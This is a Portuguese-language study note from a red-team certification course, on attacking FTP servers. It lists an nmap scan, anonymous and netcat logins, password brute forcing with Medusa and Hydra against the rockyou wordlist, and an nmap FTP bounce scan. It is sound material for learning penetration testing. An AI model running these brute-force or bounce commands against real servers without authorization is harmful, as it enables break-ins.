> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/attacking-common-services/ftp.md).

# FTP

O [File Transfer Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol) ( `FTP`) é um protocolo de rede padrão usado para transferir arquivos entre computadores. Ele também executa operações de diretório e arquivos, como alterar o diretório de trabalho, listar arquivos e renomear e excluir diretórios ou arquivos. Por padrão, o FTP escuta na porta `TCP/21`.

Para atacar um servidor FTP, podemos abusar de configuração incorreta ou privilégios excessivos, explorar vulnerabilidades conhecidas ou descobrir novas vulnerabilidades.

* **Nmap**

```sh
sudo nmap -sC -sV -p 21 <FQDN/IP> 
```

* **Autenticação Anônima**
* `anonymous : anonymous`  Autenticação via FTP

```sh
ftp <FQDN/IP>
```

* Conectando ao servidor FTP usando `netcat`.

```sh
nc -v <FQDN/IP> 21
```

* **Força bruta com Medusa**

```sh
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h <FQDN/IP> -M ftp 
```

* **Força bruta com Hydra**

```sh
hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://<FQDN/IP>
```

* **FTP Bounce Attack**

Um ataque de rejeição de FTP é um ataque de rede que usa servidores FTP para entregar tráfego de saída para outro dispositivo na rede.

```sh
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
